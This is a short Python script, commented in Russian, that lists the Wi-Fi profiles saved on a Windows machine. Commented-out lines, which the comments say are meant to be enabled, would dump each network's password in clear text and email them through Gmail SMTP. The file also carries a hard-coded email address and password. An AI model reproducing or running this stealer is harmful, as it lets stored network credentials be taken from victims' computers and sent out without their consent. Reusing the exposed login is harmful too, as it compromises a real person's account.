import subprocess, smtplib, re


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
# network_names = re.search("(?:xa9 \s*:\s)(.*)", str(networks))
net = networks.decode('cp866')
network_names = re.findall("(?:пользователей \s*:\s)(.*)", net)
# print(network_names)
result = ""
# если раскомментить все, что серое внизу, то по идее можнго получить пароли от всех сохраненных сетей
# пока этот код просто выводит весь список сетей, можно вручную их загонять
for net_name in network_names:
    print(net_name)
    # cmd = "netsh wlan show profile " + net_name + " key=clear"
    # current_res = subprocess.check_output(cmd, shell=True)
    # result = result + str(current_res)

# send_mail("sereganazemcev@gmail.com", "22833720041917Master", result)
